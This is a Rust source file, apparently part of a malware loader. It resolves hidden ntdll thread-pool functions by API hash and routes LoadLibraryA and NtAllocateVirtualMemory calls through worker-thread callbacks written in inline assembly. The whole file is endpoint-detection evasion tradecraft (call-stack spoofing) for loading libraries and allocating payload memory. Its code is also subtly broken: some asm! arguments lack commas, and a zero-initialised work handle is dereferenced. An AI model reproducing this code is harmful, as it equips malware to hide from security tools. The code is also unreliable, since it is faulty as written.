use crate::{
    api_hashing::get_function_address,
    PTP_CALLBACK_INSTANCE,
    PTP_WORK,
    PTP_WORK_CALLBACK,
    TP_CALLBACK_ENVIRON_V3,
    api_hashing::get_module_handle,
    NTDLL_HASH,
    TP_ALLOC_WORK_HASH,
    TP_POST_WORK_HASH,
    TP_RELEASE_WORK_HASH,
    NTSTATUS,
    c_void,
    asm,
    HANDLE
};

type TpAllocWork = unsafe extern "system" fn(*mut PTP_WORK, PTP_WORK_CALLBACK, *mut c_void, *mut TP_CALLBACK_ENVIRON_V3) -> NTSTATUS;
type TpPostWork = unsafe extern "system" fn(PTP_WORK);
type TpReleaseWork = unsafe extern "system" fn(PTP_WORK);

#[link_section = ".text"]
pub unsafe fn exec_callback(callback: PTP_WORK_CALLBACK, args: *mut c_void) -> bool {
    let ntdll_address = get_module_handle(NTDLL_HASH).unwrap();

    let tp_alloc_work = (*(get_function_address(ntdll_address, TP_ALLOC_WORK_HASH).unwrap())) as TpAllocWork;
    let tp_post_work = (*(get_function_address(ntdll_address, TP_POST_WORK_HASH).unwrap())) as TpPostWork;
    let tp_release_work = (*(get_function_address(ntdll_address, TP_RELEASE_WORK_HASH).unwrap())) as TpReleaseWork;

    let work_return: PTP_WORK = 0;

    tp_alloc_work(*work_return, callback, args, 0 as *mut TP_CALLBACK_ENVIRON_V3);
    tp_post_work(work_return);
    tp_release_work(work_return);

    return true;
}

#[link_section = ".text"]
pub unsafe extern "stdcall" fn loadlibrary_callback(_instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, _work: PTP_WORK) {
    asm!("mov rbx, rdi",
         "mov rax, [rbx]",       // pointer to LoadLibraryA
         "mov rcx, [rbx + 0x8]"  // pointer to string
         "jmp rax",
         in("rdi") context,
        )
}

#[link_section = ".text"]
pub unsafe extern "stdcall" fn nt_allocate_callback(_instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, _work: PTP_WORK) {
    asm!("mov rbx, rdi"
        "mov rax, [rbx]"
        "mov rcx, [rbx + 0x8]"
        "mov rdx, [rbx + 0x10]"
        "xor r8, r8",               // https://0xdarkvortex.dev/hiding-in-plainsight/
        "mov r9, [rbx + 0x18]",
        "mov r10, [rbx + 0x20]",
        "mov [rsp+0x30], r10",
        "mov r10, 0x3000",
        "mov [rsp+0x28], r10",
        "jmp rax",
        in("rdi") context,
        )
}

#[repr(C)]
pub struct load_library_args {
    pub function_pointer: usize,
    pub library_name: *const i8,
}

#[repr(C)]
pub struct nt_alloc_args {
    pub function_pointer: usize,
    pub process: HANDLE,
    pub address: *mut c_void,
    pub size: *mut usize,
    pub permissions: u32
}

#[repr(C)]
pub struct nt_protect_args {
    pub function_pointer: usize,
    pub process: HANDLE,
    pub address: *mut c_void,
    pub size: *mut usize,
    pub access_protection: u32,
}